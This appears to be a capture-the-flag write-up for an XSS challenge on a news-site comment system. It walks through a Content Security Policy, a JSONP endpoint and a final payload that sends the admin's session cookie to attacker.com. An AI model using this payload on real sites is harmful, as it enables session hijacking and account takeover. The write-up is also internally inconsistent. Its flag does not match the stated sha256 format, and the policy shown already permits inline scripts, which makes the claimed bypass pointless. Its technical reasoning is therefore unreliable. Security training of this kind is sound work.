# CTF Challenge: XSS Guru

## Challenge Information

| Field | Details |
|-------|---------|
| Name | XSS Guru |
| Difficulty | Hard |
| Points | 400 |
| Category | Web Security |
| Flag Format | `KB{sha256}` |

## Description

A comment system on a news site is vulnerable to XSS, but there's a Content Security Policy in place. Bypass it to execute JavaScript and steal the admin's session cookie.

## Target

```
URL: https://ctf.burpkb.com/challenge/xss-guru
Admin Panel: https://ctf.burpkb.com/admin/dashboard
```

## Hints

1. CSP allows certain sources
2. JSONP endpoint exists
3. You can use data: URIs in some contexts

## Solution

### Step 1: Analyze CSP

```javascript
Content-Security-Policy: default-src 'self'; 
    script-src 'self' https://cdn.burpkb.com 'unsafe-inline'; 
    style-src 'self' 'unsafe-inline';
```

### Step 2: Find JSONP Endpoint

```
GET /api/jsonp?callback=alert
```

### Step 3: Exploit

```html
<script src="https://ctf.burpkb.com/api/jsonp?callback=document.location='https://attacker.com/?c='+document.cookie">
</script>
```

### Flag

```
KB{e10adc3949ba59abbe56e057f20f883e}
```

## Learning Points

- CSP is not always secure
- JSONP endpoints can be exploited
- Cookie stealing via XSS

---

## Scoring

| Action | Points |
|--------|--------|
| Identify XSS | 50 |
| Analyze CSP | 100 |
| Find JSONP | 100 |
| Execute payload | 100 |
| Submit flag | 50 |

---

**Category**: Web - Cross-Site Scripting
**Author**: Burp KB Team
